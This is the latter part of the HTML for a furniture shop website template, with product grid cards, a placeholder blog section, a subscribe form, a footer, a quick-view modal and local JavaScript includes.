														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/7.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 60.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/8.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 66.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
									</div>
								</div>
								<div class="tab-pane" id="discounts">
									<div class="row">
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label new-label">new</span>
												<a href="single-product.html"><img src="images/8.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 56.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label sale-label">Sale</span>
												<a href="single-product.html"><img src="images/9.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 36.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/7.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 66.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/6.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 57.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label new-label">new</span>
												<a href="single-product.html"><img src="images/3.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 55.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<span class="pro-label sale-label">Sale</span>
												<a href="single-product.html"><img src="images/4.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 65.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/5.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 60.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
										<!-- Single-product start -->
										<div class="single-product col-xl-3 col-lg-4 col-md-6">
											<div class="product-img">
												<a href="single-product.html"><img src="images/2.jpg" alt></a>
												<div class="product-action clearfix">
													<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
													<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
													<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
													<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
												</div>
											</div>
											<div class="product-info clearfix">
												<div class="fix">
													<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
													<p class="floatright hidden-sm">Furniture</p>
												</div>
												<div class="fix">
													<span class="pro-price floatleft">$ 66.20</span>
													<span class="pro-rating floatright">
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
														<a href="#"><i class="zmdi zmdi-star-half"></i></a>
													</span>
												</div>
											</div>
										</div>
										<!-- Single-product end -->
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- PURCHASE-ONLINE-AREA END -->
			<!-- BLGO-AREA START -->
			<div class="blog-area pt-55">
				<div class="container">
					<!-- Section-title start -->
					<div class="row">
						<div class="col-lg-12">
							<div class="section-title text-center">
								<h2 class="title-border">From The Blog</h2>
							</div>
						</div>
					</div>
					<!-- Section-title end -->
					<div class="row">
						<!-- Single-blog start -->
						<div class="col-lg-6">
							<div class="single-blog mt-30">
								<div class="row">
									<div class="col-xl-6 col-md-7">
										<div class="blog-info">
											<div class="post-meta fix">
												<div class="post-date floatleft"><span class="text-dark-red">30</span></div>
												<div class="post-year floatleft">
													<p class="text-uppercase text-dark-red mb-0">June, 2021</p>
													<h4 class="post-title"><a href="#" tabindex="0">Farniture drawing 2021</a></h4>
												</div>
											</div>
											<div class="like-share fix">
												<a href="#"><i class="zmdi zmdi-favorite"></i><span>89 Like</span></a>
												<a href="#"><i class="zmdi zmdi-comments"></i><span>59 Comments</span></a>
												<a href="#"><i class="zmdi zmdi-share"></i><span>29 Share</span></a>
											</div>
											<p>There are many variations of passages of Lorem Ipsum available, but the majority have suffered If you are going to use a passage  Lorem Ipsum, you alteration in some form.</p>
											<a href="#" class="button-2 text-dark-red">Read more...</a>
										</div>
									</div>
									<div class="col-xl-6 col-md-5">
										<div class="blog-photo">
											<a href="#"><img src="images/1_5.jpg" alt></a>
										</div>
									</div>
								</div>
							</div>
						</div>
						<!-- Single-blog end -->
						<!-- Single-blog start -->
						<div class="col-lg-6">
							<div class="single-blog mt-30">
								<div class="row">
									<div class="col-xl-6 col-md-7">
										<div class="blog-info">
											<div class="post-meta fix">
												<div class="post-date floatleft"><span class="text-dark-red">30</span></div>
												<div class="post-year floatleft">
													<p class="text-uppercase text-dark-red mb-0">June, 2021</p>
													<h4 class="post-title"><a href="#" tabindex="0">Farniture drawing 2021</a></h4>
												</div>
											</div>
											<div class="like-share fix">
												<a href="#"><i class="zmdi zmdi-favorite"></i><span>89 Like</span></a>
												<a href="#"><i class="zmdi zmdi-comments"></i><span>59 Comments</span></a>
												<a href="#"><i class="zmdi zmdi-share"></i><span>29 Share</span></a>
											</div>
											<p>There are many variations of passages of Lorem Ipsum available, but the majority have suffered If you are going to use a passage  Lorem Ipsum, you alteration in some form.</p>
											<a href="#" class="button-2 text-dark-red">Read more...</a>
										</div>
									</div>
									<div class="col-xl-6 col-md-5">
										<div class="blog-photo">
											<a href="#"><img src="images/2_5.jpg" alt></a>
										</div>
									</div>
								</div>
							</div>
						</div>
						<!-- Single-blog end -->
					</div>
				</div>
			</div>
			<!-- BLGO-AREA END -->
			<!-- SUBSCRIVE-AREA START -->
			<div class="subscribe-area pt-80">
				<div class="container">
					<div class="row">
						<div class="col-lg-12">
							<div class="subscribe">
								<form action="#">
									<input type="text" placeholder="Enter your email address">
									<button class="submit-button submit-btn-2 button-one" data-text="subscribe" type="submit">subscribe</button>
								</form>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- SUBSCRIVE-AREA END -->
			<!-- FOOTER START -->
			<footer>
				<!-- Footer-area start -->
				<div class="footer-area">
					<div class="container">
						<div class="row">
							<div class="col-lg-4 col-md-6">
								<div class="single-footer">
									<h3 class="footer-title  title-border">Contact Us</h3>
									<ul class="footer-contact">
										<li><span>Address :</span>28 Green Tower, Street Name,<br>New York City, USA</li>
										<li><span>Cell-Phone :</span>012345 - 123456789</li>
										<li><span>Email :</span>your-email@gmail.com</li>
									</ul>
								</div>
							</div>
							<div class="col-lg-2 col-md-3 col-sm-6">
								<div class="single-footer">
									<h3 class="footer-title  title-border">accounts</h3>
									<ul class="footer-menu">
										<li><a href="#"><i class="zmdi zmdi-dot-circle"></i>My Account</a></li>
										<li><a href="#"><i class="zmdi zmdi-dot-circle"></i>My Wishlist</a></li>
										<li><a href="#"><i class="zmdi zmdi-dot-circle"></i>My Cart</a></li>
										<li><a href="#"><i class="zmdi zmdi-dot-circle"></i>Sign In</a></li>
										<li><a href="#"><i class="zmdi zmdi-dot-circle"></i>Check out</a></li>
									</ul>
								</div>
							</div>
							<div class="col-lg-2 col-md-3 col-sm-6">
								<div class="single-footer">
									<h3 class="footer-title  title-border">shipping</h3>
									<ul class="footer-menu">
										<li><a href="#"><i class="zmdi zmdi-dot-circle"></i>New Products</a></li>
										<li><a href="#"><i class="zmdi zmdi-dot-circle"></i>Top Sellers</a></li>
										<li><a href="#"><i class="zmdi zmdi-dot-circle"></i>Manufactirers</a></li>
										<li><a href="#"><i class="zmdi zmdi-dot-circle"></i>Suppliers</a></li>
										<li><a href="#"><i class="zmdi zmdi-dot-circle"></i>Specials</a></li>
									</ul>
								</div>
							</div>
							<div class="col-lg-4 col-md-6">
								<div class="single-footer">
									<h3 class="footer-title  title-border">your choice Products</h3>
									<div class="footer-product">
										<div class="row">
											<div class="col-sm-6 col-12">
												<div class="footer-thumb">
													<a href="#"><img src="images/1_7.jpg" alt></a>
													<div class="footer-thumb-info">
														<p><a href="#">Furniture Product<br>Name</a></p>
														<h4 class="price-3">$ 60.00</h4>
													</div>
												</div>
											</div>
											<div class="col-sm-6 col-12">
												<div class="footer-thumb">
													<a href="#"><img src="images/1_7.jpg" alt></a>
													<div class="footer-thumb-info">
														<p><a href="#">Furniture Product<br>Name</a></p>
														<h4 class="price-3">$ 60.00</h4>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<!-- Footer-area end -->
				<!-- Copyright-area start -->
				<div class="copyright-area">
					<div class="container">
						<div class="row">
							<div class="col-md-6">
								<div class="copyright">
									<p class="mb-0">© <a href=" https://themeforest.net/user/codecarnival/portfolio " target="_blank"> CodeCarnival  </a> 2022. All Rights Reserved.</p>
								</div>
							</div>
							<div class="col-md-6">
								<div class="payment  text-md-end">
									<a href="#"><img src="images/1.png" alt></a>
									<a href="#"><img src="images/2.png" alt></a>
									<a href="#"><img src="images/3.png" alt></a>
									<a href="#"><img src="images/4.png" alt></a>
								</div>
							</div>
						</div>
					</div>
				</div>
				<!-- Copyright-area start -->
			</footer>
			<!-- FOOTER END -->
			<!-- QUICKVIEW PRODUCT -->
			<div id="quickview-wrapper">
			   <!-- Modal -->
			   <div class="modal fade" id="productModal" tabindex="-1" role="dialog">
					<div class="modal-dialog" role="document">
						<div class="modal-content">
							<div class="modal-header">
								<button type="button" class="close" data-bs-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
							</div>
							<div class="modal-body">
								<div class="modal-product">
									<div class="product-images">
										<div class="main-image images">
											<img alt="#" src="images/quickview-photo.jpg">
										</div>
									</div><!-- .product-images -->

									<div class="product-info">
										<h1>Aenean eu tristique</h1>
										<div class="price-box-3">
											<hr>
											<div class="s-price-box">
												<span class="new-price">$160.00</span>
												<span class="old-price">$190.00</span>
											</div>
											<hr>
										</div>
										<a href="shop.html" class="see-all">See all features</a>
										<div class="quick-add-to-cart">
											<form method="post" class="cart">
												<div class="numbers-row">
													<input type="number" id="french-hens" value="3" min="1">
												</div>
												<button class="single_add_to_cart_button" type="submit">Add to cart</button>
											</form>
										</div>
										<div class="quick-desc">
											Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam fringilla augue nec est tristique auctor. Donec non est at libero.
										</div>
										<div class="social-sharing">
											<div class="widget widget_socialsharing_widget">
												<h3 class="widget-title-modal">Share this product</h3>
												<ul class="social-icons">
													<li><a target="_blank" title="Google +" href="#" class="gplus social-icon"><i class="zmdi zmdi-google-plus"></i></a></li>
													<li><a target="_blank" title="Twitter" href="#" class="twitter social-icon"><i class="zmdi zmdi-twitter"></i></a></li>
													<li><a target="_blank" title="Facebook" href="#" class="facebook social-icon"><i class="zmdi zmdi-facebook"></i></a></li>
													<li><a target="_blank" title="LinkedIn" href="#" class="linkedin social-icon"><i class="zmdi zmdi-linkedin"></i></a></li>
												</ul>
											</div>
										</div>
									</div><!-- .product-info -->
								</div><!-- .modal-product -->
							</div><!-- .modal-body -->
						</div><!-- .modal-content -->
					</div><!-- .modal-dialog -->
			   </div>
			   <!-- END Modal -->
			</div>
			<!-- END QUICKVIEW PRODUCT -->

		</div>
		<!-- WRAPPER END -->

		<!-- all js here -->
		<!-- jquery latest version -->
		<script src="js/jquery-3.6.0.min.js"></script>
		<script src="js/jquery-migrate-3.3.2.min.js"></script>
		<!-- bootstrap js -->
		<script src="js/bootstrap.bundle.min.js"></script>
		<!-- jquery.meanmenu js -->
		<script src="js/jquery.meanmenu.js"></script>
		<!-- slick.min js -->
		<script src="js/slick.min.js"></script>
		<!-- jquery.treeview js -->
		<script src="js/jquery.treeview.js"></script>
		<!-- lightbox.min js -->
		<script src="js/lightbox.min.js"></script>
		<!-- jquery-ui js -->
		<script src="js/jquery-ui.min.js"></script>
		<!-- jquery.nivo.slider js -->
		<script src="js/jquery.nivo.slider.js"></script>
		<script src="js/home.js"></script>
		<!-- jquery.nicescroll.min js -->
		<script src="js/jquery.nicescroll.min.js"></script>
		<!-- countdon.min js -->
		<script src="js/countdon.min.js"></script>
		<!-- wow js -->
		<script src="js/wow.min.js"></script>
		<!-- plugins js -->
		<script src="js/plugins.js"></script>
		<!-- main js -->
		<script src="js/main.min.js"></script>
	

</body></html>